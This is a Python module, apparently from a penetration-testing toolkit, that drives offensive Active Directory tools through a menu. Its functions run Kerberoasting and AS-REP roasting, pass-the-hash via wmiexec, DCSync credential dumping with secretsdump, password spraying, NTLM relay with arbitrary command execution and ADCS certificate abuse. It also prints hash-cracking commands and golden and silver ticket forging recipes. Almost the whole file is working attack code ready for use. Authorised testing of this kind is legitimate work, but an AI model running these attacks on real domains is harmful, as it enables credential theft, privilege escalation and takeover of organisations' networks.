"""
Active Directory & LDAP Module - Domain Enumeration & Attack
AD enumeration, Kerberoasting, pass-the-hash, BloodHound integration, LDAP injection.
"""

import os
import time
from modules.utils import (
    run_command, check_tool, check_root, require_root,
    print_info, print_warning, print_error, print_status,
    print_section, print_banner, get_user_input, confirm_action,
    display_menu, Colors
)


def ad_ldap_tools():
    """Active Directory & LDAP Attack Suite."""
    while True:
        choice = display_menu("Active Directory & LDAP Tools", [
            "LDAP enumeration",
            "AD domain enumeration",
            "Kerberos attacks (kerberoast/AS-REP)",
            "Pass-the-hash / Pass-the-ticket",
            "SMB enumeration & relay",
            "BloodHound data collection",
            "Password spraying",
            "GPP password extraction",
            "NTLM relay attack",
            "AD certificate abuse (ESC1-ESC8)",
            "Check AD/LDAP tools",
        ], Colors.MAGENTA)
        if choice == 0: break
        elif choice == 1: _ldap_enum()
        elif choice == 2: _ad_enum()
        elif choice == 3: _kerberos_attacks()
        elif choice == 4: _pass_the_hash()
        elif choice == 5: _smb_enum()
        elif choice == 6: _bloodhound_collect()
        elif choice == 7: _password_spray()
        elif choice == 8: _gpp_passwords()
        elif choice == 9: _ntlm_relay()
        elif choice == 10: _ad_cert_abuse()
        elif choice == 11: _check_ad_tools()


def _ldap_enum():
    """LDAP enumeration and queries."""
    target = get_user_input("LDAP server (IP or hostname)")
    if not target:
        return
    base_dn = get_user_input("Base DN (e.g. DC=corp,DC=local)", "")
    port = get_user_input("Port", "389")
    if check_tool("ldapsearch"):
        print_section("LDAP Enumeration: %s" % target)
        # Anonymous bind attempt
        print_status("Attempting anonymous LDAP bind...")
        stdout, stderr, rc = run_command(
            "ldapsearch -x -H ldap://%s:%s -b '%s' -s base 2>&1" % (target, port, base_dn), timeout=15)
        if rc == 0 and stdout:
            print_info("Anonymous bind SUCCESSFUL")
            print(stdout[:2000])
        else:
            print_warning("Anonymous bind failed: %s" % (stderr or "access denied"))
            user = get_user_input("Bind DN (user)")
            password = get_user_input("Password")
            if user and password:
                stdout, _, _ = run_command(
                    "ldapsearch -x -H ldap://%s:%s -D '%s' -w '%s' -b '%s' 2>&1" % (target, port, user, password, base_dn), timeout=30)
                if stdout: print(stdout[:3000])
        # Enumerate users
        if confirm_action("Enumerate users?"):
            print_status("Searching for user objects...")
            filter_q = "(objectClass=person)"
            stdout, _, _ = run_command(
                "ldapsearch -x -H ldap://%s:%s -b '%s' '%s' cn sAMAccountName mail 2>&1" % (target, port, base_dn, filter_q), timeout=30)
            if stdout: print(stdout[:3000])
        # Enumerate groups
        if confirm_action("Enumerate groups?"):
            stdout, _, _ = run_command(
                "ldapsearch -x -H ldap://%s:%s -b '%s' '(objectClass=group)' cn member 2>&1" % (target, port, base_dn), timeout=30)
            if stdout: print(stdout[:3000])
    else:
        print_error("ldapsearch required. Install: sudo apt install ldap-utils")
        # Try python-based LDAP
        print_info("Alternative: python3 -c 'import ldap3' (pip install ldap3)")


def _ad_enum():
    """Active Directory domain enumeration."""
    target = get_user_input("Domain controller IP")
    domain = get_user_input("Domain name (e.g. corp.local)")
    if not target or not domain:
        return
    print_section("AD Enumeration: %s (%s)" % (domain, target))
    # enum4linux
    if check_tool("enum4linux") or check_tool("enum4linux-ng"):
        tool = "enum4linux-ng" if check_tool("enum4linux-ng") else "enum4linux"
        print_status("Running %s..." % tool)
        stdout, _, _ = run_command("%s -a %s 2>&1 | head -100" % (tool, target), timeout=60)
        if stdout: print(stdout[:3000])
    # rpcclient
    if check_tool("rpcclient"):
        print_section("RPC Enumeration")
        print_status("Attempting null session...")
        cmds = ["enumdomusers", "enumdomgroups", "querydominfo"]
        for rpc_cmd in cmds:
            stdout, _, _ = run_command(
                "rpcclient -U '' -N %s -c '%s' 2>&1" % (target, rpc_cmd), timeout=15)
            if stdout and "NT_STATUS" not in stdout:
                print_info("[%s]" % rpc_cmd)
                print(stdout[:1000])
    # DNS enum
    if check_tool("dig"):
        print_section("DNS Records")
        for record in ["A", "NS", "MX", "SRV"]:
            stdout, _, _ = run_command("dig @%s %s %s +short 2>&1" % (target, domain, record), timeout=5)
            if stdout: print_info("  %s: %s" % (record, stdout.strip().replace("\n", ", ")))
        # SRV records for DC
        stdout, _, _ = run_command("dig @%s _ldap._tcp.%s SRV +short 2>&1" % (target, domain), timeout=5)
        if stdout: print_info("  LDAP SRV: %s" % stdout.strip())
        stdout, _, _ = run_command("dig @%s _kerberos._tcp.%s SRV +short 2>&1" % (target, domain), timeout=5)
        if stdout: print_info("  Kerberos SRV: %s" % stdout.strip())


def _kerberos_attacks():
    """Kerberos attacks - Kerberoasting, AS-REP roasting."""
    sub = display_menu("Kerberos Attacks", [
        "Kerberoast (request TGS tickets)",
        "AS-REP roast (no pre-auth users)",
        "Kerberos user enumeration",
        "Golden ticket info",
        "Silver ticket info",
    ], Colors.MAGENTA)
    if sub == 0: return
    dc = get_user_input("Domain controller IP")
    domain = get_user_input("Domain (e.g. corp.local)")
    if not dc or not domain:
        return
    if sub == 1:
        if check_tool("GetUserSPNs.py") or check_tool("impacket-GetUserSPNs"):
            tool = "impacket-GetUserSPNs" if check_tool("impacket-GetUserSPNs") else "GetUserSPNs.py"
            user = get_user_input("Domain username")
            password = get_user_input("Password")
            print_status("Kerberoasting...")
            cmd = "%s %s/%s:%s -dc-ip %s -request 2>&1" % (tool, domain, user, password, dc)
            stdout, _, _ = run_command(cmd, timeout=30)
            if stdout:
                print(stdout[:3000])
                if "$krb5tgs$" in stdout:
                    print_warning("TGS tickets found! Crack with:")
                    print_info("  hashcat -m 13100 tickets.txt wordlist.txt")
                    print_info("  john --format=krb5tgs tickets.txt")
        else:
            print_error("Impacket required. Install: pip install impacket")
    elif sub == 2:
        if check_tool("GetNPUsers.py") or check_tool("impacket-GetNPUsers"):
            tool = "impacket-GetNPUsers" if check_tool("impacket-GetNPUsers") else "GetNPUsers.py"
            userlist = get_user_input("User list file (or single username)")
            if os.path.isfile(userlist):
                cmd = "%s %s/ -dc-ip %s -usersfile %s -no-pass 2>&1" % (tool, domain, dc, userlist)
            else:
                cmd = "%s %s/%s -dc-ip %s -no-pass 2>&1" % (tool, domain, userlist, dc)
            print_status("AS-REP roasting...")
            stdout, _, _ = run_command(cmd, timeout=30)
            if stdout:
                print(stdout[:3000])
                if "$krb5asrep$" in stdout:
                    print_warning("AS-REP hashes found! Crack with:")
                    print_info("  hashcat -m 18200 hashes.txt wordlist.txt")
        else:
            print_error("Impacket required.")
    elif sub == 3:
        if check_tool("kerbrute"):
            userlist = get_user_input("Username wordlist path")
            print_status("Enumerating valid users via Kerberos...")
            stdout, _, _ = run_command("kerbrute userenum --dc %s -d %s %s 2>&1" % (dc, domain, userlist), timeout=60)
            if stdout: print(stdout[:3000])
        else:
            print_error("kerbrute not found. Download from GitHub.")
    elif sub == 4:
        print_section("Golden Ticket Attack Info")
        print_info("Requirements:")
        print_info("  - Domain SID: Get with 'lookupsid.py domain/user:pass@DC'")
        print_info("  - KRBTGT hash: Get via DCSync or ntds.dit extraction")
        print_info("  - Domain name")
        print_info("\nCreate: ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <user>")
        print_info("Use: export KRB5CCNAME=<user>.ccache")
    elif sub == 5:
        print_section("Silver Ticket Attack Info")
        print_info("Requirements:")
        print_info("  - Service account NTLM hash")
        print_info("  - Domain SID")
        print_info("  - Target SPN (e.g. CIFS/server.domain.local)")
        print_info("\nCreate: ticketer.py -nthash <hash> -domain-sid <SID> -domain <domain> -spn <SPN> <user>")


def _pass_the_hash():
    """Pass-the-hash and pass-the-ticket attacks."""
    sub = display_menu("Credential Relay Attacks", [
        "Pass-the-hash (PTH)",
        "Pass-the-ticket (PTT)",
        "Overpass-the-hash",
        "DCSync attack",
        "Dump NTDS.dit",
    ], Colors.MAGENTA)
    if sub == 0: return
    target = get_user_input("Target IP")
    domain = get_user_input("Domain")
    user = get_user_input("Username")
    if not target:
        return
    if sub == 1:
        nthash = get_user_input("NTLM hash (LM:NT or just NT)")
        if not nthash:
            return
        if check_tool("pth-winexe") or check_tool("wmiexec.py") or check_tool("impacket-wmiexec"):
            if check_tool("impacket-wmiexec") or check_tool("wmiexec.py"):
                tool = "impacket-wmiexec" if check_tool("impacket-wmiexec") else "wmiexec.py"
                cmd = "%s %s/%s@%s -hashes :%s 2>&1" % (tool, domain, user, target, nthash)
                print_status("Pass-the-hash with wmiexec...")
                stdout, _, _ = run_command(cmd, timeout=15)
                if stdout: print(stdout[:2000])
            elif check_tool("pth-winexe"):
                cmd = "pth-winexe -U '%s/%s%%%s' //%s cmd.exe 2>&1" % (domain, user, nthash, target)
                print_info("Command: %s" % cmd)
        else:
            print_error("Impacket or pth-toolkit required.")
            print_info("Install: pip install impacket")
    elif sub == 2:
        ticket = get_user_input("Ticket file (.ccache)")
        if ticket:
            print_info("export KRB5CCNAME='%s'" % ticket)
            print_info("Then use -k flag with impacket tools")
    elif sub == 3:
        nthash = get_user_input("NTLM hash")
        if nthash and (check_tool("getTGT.py") or check_tool("impacket-getTGT")):
            tool = "impacket-getTGT" if check_tool("impacket-getTGT") else "getTGT.py"
            cmd = "%s %s/%s -hashes :%s 2>&1" % (tool, domain, user, nthash)
            print_status("Getting TGT via overpass-the-hash...")
            stdout, _, _ = run_command(cmd, timeout=15)
            if stdout: print(stdout[:2000])
    elif sub == 4:
        if check_tool("secretsdump.py") or check_tool("impacket-secretsdump"):
            tool = "impacket-secretsdump" if check_tool("impacket-secretsdump") else "secretsdump.py"
            password = get_user_input("Password (or use -hashes)")
            if password:
                cmd = "%s %s/%s:'%s'@%s 2>&1" % (tool, domain, user, password, target)
                print_status("Running DCSync...")
                stdout, _, _ = run_command(cmd, timeout=60)
                if stdout: print(stdout[:5000])
        else:
            print_error("Impacket required.")
    elif sub == 5:
        print_info("Methods to dump NTDS.dit:")
        print_info("  1. secretsdump.py (remote DCSync)")
        print_info("  2. ntdsutil (on DC): ntdsutil 'activate instance ntds' 'ifm' 'create full c:\\ntds'")
        print_info("  3. Volume Shadow Copy: vssadmin create shadow /for=C:")
        print_info("  4. Extract: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL")


def _smb_enum():
    """SMB enumeration and relay attacks."""
    target = get_user_input("Target IP")
    if not target:
        return
    print_section("SMB Enumeration: %s" % target)
    # smbclient
    if check_tool("smbclient"):
        print_status("Listing shares (null session)...")
        stdout, _, _ = run_command("smbclient -L //%s -N 2>&1" % target, timeout=15)
        if stdout: print(stdout[:2000])
    # crackmapexec
    if check_tool("crackmapexec") or check_tool("cme") or check_tool("nxc"):
        tool = "nxc" if check_tool("nxc") else ("cme" if check_tool("cme") else "crackmapexec")
        print_section("CrackMapExec SMB")
        stdout, _, _ = run_command("%s smb %s 2>&1" % (tool, target), timeout=15)
        if stdout: print(stdout[:2000])
        stdout, _, _ = run_command("%s smb %s --shares -u '' -p '' 2>&1" % (tool, target), timeout=15)
        if stdout: print(stdout[:2000])
    # nmap SMB scripts
    if check_tool("nmap"):
        print_section("Nmap SMB Scripts")
        stdout, _, _ = run_command("nmap -p 445 --script smb-enum-shares,smb-os-discovery %s 2>&1" % target, timeout=30)
        if stdout: print(stdout[:2000])


def _bloodhound_collect():
    """BloodHound data collection."""
    print_section("BloodHound Data Collection")
    dc = get_user_input("Domain controller IP")
    domain = get_user_input("Domain name")
    user = get_user_input("Username")
    password = get_user_input("Password")
    if not all([dc, domain, user, password]):
        return
    if check_tool("bloodhound-python"):
        print_status("Running BloodHound Python collector...")
        cmd = "bloodhound-python -u '%s' -p '%s' -d %s -ns %s -c All 2>&1" % (user, password, domain, dc)
        stdout, _, _ = run_command(cmd, timeout=120)
        if stdout: print(stdout[:3000])
        print_info("Upload .json files to BloodHound GUI for analysis.")
    elif check_tool("SharpHound.exe") or check_tool("sharphound"):
        print_info("SharpHound available - run from Windows domain-joined machine.")
    else:
        print_error("bloodhound-python required. Install: pip install bloodhound")
        print_info("Or use SharpHound.exe from a Windows machine.")


def _password_spray():
    """Password spraying against AD."""
    target = get_user_input("Target (DC IP or domain)")
    if not target:
        return
    userlist = get_user_input("User list file")
    password = get_user_input("Password to spray")
    if not userlist or not password:
        return
    print_warning("Password spraying can lock accounts! Be careful with lockout policies.")
    if not confirm_action("Proceed with password spray?"):
        return
    if check_tool("crackmapexec") or check_tool("nxc"):
        tool = "nxc" if check_tool("nxc") else "crackmapexec"
        cmd = "%s smb %s -u %s -p '%s' --continue-on-success 2>&1" % (tool, target, userlist, password)
        print_status("Spraying...")
        stdout, _, _ = run_command(cmd, timeout=120)
        if stdout: print(stdout[:5000])
    elif check_tool("kerbrute"):
        domain = get_user_input("Domain name")
        cmd = "kerbrute passwordspray --dc %s -d %s %s '%s' 2>&1" % (target, domain, userlist, password)
        print_status("Spraying via Kerberos...")
        stdout, _, _ = run_command(cmd, timeout=120)
        if stdout: print(stdout[:5000])
    else:
        print_error("crackmapexec/nxc or kerbrute required.")


def _gpp_passwords():
    """Extract Group Policy Preference passwords."""
    target = get_user_input("Domain controller IP or SYSVOL share path")
    if not target:
        return
    if check_tool("gpp-decrypt"):
        cpassword = get_user_input("cpassword value (from Groups.xml)")
        if cpassword:
            stdout, _, _ = run_command("gpp-decrypt '%s' 2>&1" % cpassword)
            if stdout: print_info("Decrypted password: %s" % stdout.strip())
    # Search SYSVOL for GPP files
    if check_tool("smbclient"):
        print_status("Searching SYSVOL for GPP files...")
        stdout, _, _ = run_command(
            "smbclient //%s/SYSVOL -N -c 'recurse; ls' 2>&1 | grep -i 'groups.xml\\|scheduledtasks.xml\\|services.xml'" % target, timeout=30)
        if stdout:
            print_warning("GPP files found:")
            print(stdout)
        else:
            print_info("No GPP preference files found (or access denied).")


def _ntlm_relay():
    """NTLM relay attack setup."""
    print_section("NTLM Relay Attack")
    if check_tool("ntlmrelayx.py") or check_tool("impacket-ntlmrelayx"):
        tool = "impacket-ntlmrelayx" if check_tool("impacket-ntlmrelayx") else "ntlmrelayx.py"
        target = get_user_input("Target to relay to (IP or targets.txt file)")
        if not target:
            return
        sub = display_menu("Relay Type", [
            "SMB relay (execute command)",
            "LDAP relay (escalate privileges)",
            "HTTP relay",
            "Dump SAM database",
        ], Colors.MAGENTA)
        if sub == 1:
            cmd_exec = get_user_input("Command to execute", "whoami")
            cmd = "%s -t %s -c '%s' 2>&1" % (tool, target, cmd_exec)
        elif sub == 2:
            cmd = "%s -t ldap://%s --escalate-user <user> 2>&1" % (tool, target)
        elif sub == 3:
            cmd = "%s -t http://%s 2>&1" % (tool, target)
        elif sub == 4:
            cmd = "%s -t %s --dump-laps --dump-gmsa --dump-adcs 2>&1" % (tool, target)
        else:
            return
        print_info("Command: %s" % cmd)
        print_info("Trigger: Use Responder or PrinterBug to capture NTLM auth")
        if confirm_action("Start relay?"):
            run_command(cmd + " &", timeout=5)
    else:
        print_error("Impacket required. Install: pip install impacket")


def _ad_cert_abuse():
    """Active Directory Certificate Services abuse."""
    print_section("AD Certificate Services (ADCS) Attacks")
    dc = get_user_input("Domain controller IP")
    domain = get_user_input("Domain")
    user = get_user_input("Username")
    password = get_user_input("Password")
    if not all([dc, domain, user]):
        return
    if check_tool("certipy") or check_tool("certipy-ad"):
        tool = "certipy-ad" if check_tool("certipy-ad") else "certipy"
        sub = display_menu("ADCS Attack", [
            "Find vulnerable templates",
            "ESC1 - Request cert as another user",
            "ESC4 - Modify template permissions",
            "ESC8 - NTLM relay to web enrollment",
        ], Colors.MAGENTA)
        if sub == 1:
            cmd = "%s find -u '%s@%s' -p '%s' -dc-ip %s -vulnerable 2>&1" % (tool, user, domain, password, dc)
            print_status("Finding vulnerable certificate templates...")
            stdout, _, _ = run_command(cmd, timeout=60)
            if stdout: print(stdout[:5000])
        elif sub == 2:
            template = get_user_input("Vulnerable template name")
            upn = get_user_input("Target UPN (e.g. administrator@domain)")
            cmd = "%s req -u '%s@%s' -p '%s' -dc-ip %s -ca '<CA-NAME>' -template '%s' -upn '%s' 2>&1" % (
                tool, user, domain, password, dc, template, upn)
            print_info("Command: %s" % cmd)
        elif sub == 3:
            print_info("ESC4: Modify template to enable ESC1, then exploit ESC1")
        elif sub == 4:
            print_info("ESC8: NTLM relay to http://<CA>/certsrv/certfnsh.asp")
            print_info("Use ntlmrelayx.py with --adcs flag")
    else:
        print_error("certipy-ad required. Install: pip install certipy-ad")


def _check_ad_tools():
    """Check available AD/LDAP tools."""
    print_section("AD / LDAP Tool Availability")
    tools = {
        "ldapsearch": "LDAP query tool",
        "rpcclient": "SMB/RPC client",
        "smbclient": "SMB share client",
        "enum4linux": "SMB/NetBIOS enumerator",
        "crackmapexec": "Network pentest framework",
        "nxc": "NetExec (CME successor)",
        "impacket-secretsdump": "Credential dumper",
        "impacket-wmiexec": "WMI execution",
        "impacket-psexec": "PsExec via SMB",
        "impacket-GetUserSPNs": "Kerberoasting",
        "impacket-GetNPUsers": "AS-REP roasting",
        "impacket-ntlmrelayx": "NTLM relay",
        "kerbrute": "Kerberos brute force",
        "bloodhound-python": "AD relationship mapper",
        "certipy-ad": "ADCS exploitation",
        "gpp-decrypt": "GPP password decryptor",
        "responder": "LLMNR/NBT-NS poisoner",
        "evil-winrm": "WinRM shell",
        "john": "Password cracker",
        "hashcat": "GPU hash cracker",
    }
    available = []
    missing = []
    for tool, desc in tools.items():
        if check_tool(tool):
            print_info("  [+] %-28s - %s" % (tool, desc))
            available.append(tool)
        else:
            print_error("  [-] %-28s - %s" % (tool, desc))
            missing.append(tool)
    print_info("\nAvailable: %d/%d" % (len(available), len(tools)))
    if missing and confirm_action("Install common AD tools?"):
        run_command("sudo apt install -y smbclient ldap-utils enum4linux 2>&1", timeout=60)
        run_command("pip install impacket bloodhound certipy-ad 2>&1", timeout=120)
